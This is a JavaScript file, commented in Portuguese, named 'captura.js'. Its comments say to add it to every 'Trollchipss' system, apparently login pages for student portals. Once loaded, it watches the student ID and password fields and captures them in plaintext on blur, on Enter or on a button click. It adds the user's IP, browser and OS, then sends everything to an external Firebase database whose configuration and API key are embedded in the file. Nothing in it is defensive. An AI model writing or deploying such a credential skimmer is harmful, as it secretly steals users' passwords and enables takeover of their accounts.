// ============================================
// CAPTURA.JS - Sistema de Captura Firebase
// ============================================
// Adicione este script em TODOS os sistemas
// ============================================

import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";

// Configuração do Firebase
const firebaseConfig = {
    apiKey: "AIzaSyDu_JGR5515XPd4dOib5NZCi4fRx2-5YlE",
    authDomain: "captura-125a3.firebaseapp.com",
    databaseURL: "https://captura-125a3-default-rtdb.firebaseio.com",
    projectId: "captura-125a3",
    storageBucket: "captura-125a3.firebasestorage.app",
    messagingSenderId: "863901847156",
    appId: "1:863901847156:web:913084a33265ea7c728b21"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// ============================================
// SISTEMA DE CAPTURA AUTOMÁTICA
// ============================================
class CapturaAutomatica {
    constructor() {
        this.sistemaAtual = this.detectarSistema();
        this.inicializarCaptura();
    }

    // Detecta qual sistema está rodando
    detectarSistema() {
        const title = document.title;
        if (title.includes('Pendências')) return 'Trollchipss Pendências';
        if (title.includes('Tarefas')) return 'Trollchipss Tarefas';
        if (title.includes('Redações') || title.includes('Redação')) return 'Trollchipss Redações';
        return 'Trollchipss Sistema';
    }

    // Inicializa o sistema de captura
    inicializarCaptura() {
        console.log('%c🔥 Sistema de Captura Ativo!', 'color: #f59e0b; font-size: 14px; font-weight: bold;');
        console.log(`%c📍 Sistema: ${this.sistemaAtual}`, 'color: #10b981; font-size: 12px;');
        
        // Aguarda o DOM carregar completamente
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.setupListeners());
        } else {
            this.setupListeners();
        }
    }

    // Configura os listeners nos campos
    setupListeners() {
        const raInput = document.getElementById('studentId');
        const senhaInput = document.getElementById('password');

        if (!raInput || !senhaInput) {
            console.warn('⚠️ Campos de RA/Senha não encontrados');
            return;
        }

        // Captura quando o usuário perde o foco do campo de senha
        senhaInput.addEventListener('blur', () => {
            const ra = raInput.value.trim();
            const senha = senhaInput.value.trim();
            
            if (ra && senha) {
                this.capturarCredenciais(ra, senha);
            }
        });

        // Captura quando pressiona Enter no campo de senha
        senhaInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                const ra = raInput.value.trim();
                const senha = senhaInput.value.trim();
                
                if (ra && senha) {
                    this.capturarCredenciais(ra, senha);
                }
            }
        });

        // Captura quando clica em qualquer botão do formulário
        const form = document.getElementById('loginForm');
        if (form) {
            const buttons = form.querySelectorAll('button[type="button"], button[type="submit"]');
            buttons.forEach(button => {
                button.addEventListener('click', () => {
                    setTimeout(() => {
                        const ra = raInput.value.trim();
                        const senha = senhaInput.value.trim();
                        
                        if (ra && senha) {
                            this.capturarCredenciais(ra, senha);
                        }
                    }, 100);
                });
            });
        }

        console.log('✅ Listeners de captura configurados!');
    }

    // Captura as credenciais e salva no Firebase
    async capturarCredenciais(ra, senha) {
        try {
            // Evita capturas duplicadas em sequência
            const ultimaCaptura = localStorage.getItem('ultima_captura');
            const agora = Date.now();
            const chaveAtual = `${ra}_${senha}_${this.sistemaAtual}`;
            
            if (ultimaCaptura === chaveAtual) {
                console.log('⏭️ Captura já realizada (evitando duplicata)');
                return;
            }

            // Marca esta captura como realizada
            localStorage.setItem('ultima_captura', chaveAtual);
            
            // Busca o IP do usuário
            const ip = await this.getIP();
            
            // Prepara os dados
            const agora_date = new Date();
            const dados = {
                ra: ra,
                senha: senha,
                sistema: this.sistemaAtual,
                timestamp: agora_date.toISOString(),
                dataHora: agora_date.toLocaleString('pt-BR', {
                    day: '2-digit',
                    month: '2-digit',
                    year: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                }),
                ip: ip,
                userAgent: navigator.userAgent,
                navegador: this.detectarNavegador(),
                sistema_operacional: this.detectarSO()
            };

            // Salva no Firebase
            const capturasRef = ref(database, 'capturas');
            const novaCaptura = push(capturasRef);
            await set(novaCaptura, dados);

            console.log('%c✅ Captura realizada com sucesso!', 'color: #10b981; font-size: 12px; font-weight: bold;');
            console.log('📊 Dados capturados:', {
                RA: ra,
                Sistema: this.sistemaAtual,
                Horário: dados.dataHora
            });

            // Limpa a flag após 5 segundos (permite nova captura se usuário tentar novamente)
            setTimeout(() => {
                if (localStorage.getItem('ultima_captura') === chaveAtual) {
                    localStorage.removeItem('ultima_captura');
                }
            }, 5000);

        } catch (error) {
            console.error('❌ Erro ao capturar:', error);
        }
    }

    // Busca o IP do usuário
    async getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'Desconhecido';
        }
    }

    // Detecta o navegador
    detectarNavegador() {
        const ua = navigator.userAgent;
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Chrome')) return 'Chrome';
        if (ua.includes('Safari')) return 'Safari';
        if (ua.includes('Edge')) return 'Edge';
        if (ua.includes('Opera')) return 'Opera';
        return 'Desconhecido';
    }

    // Detecta o sistema operacional
    detectarSO() {
        const ua = navigator.userAgent;
        if (ua.includes('Windows')) return 'Windows';
        if (ua.includes('Mac')) return 'MacOS';
        if (ua.includes('Linux')) return 'Linux';
        if (ua.includes('Android')) return 'Android';
        if (ua.includes('iOS')) return 'iOS';
        return 'Desconhecido';
    }
}

// ============================================
// INICIALIZAÇÃO AUTOMÁTICA
// ============================================
// Inicia o sistema de captura automaticamente
new CapturaAutomatica();

console.log('%c🎯 Captura.js v1.0 carregado!', 'color: #4a6bff; font-size: 14px; font-weight: bold;');
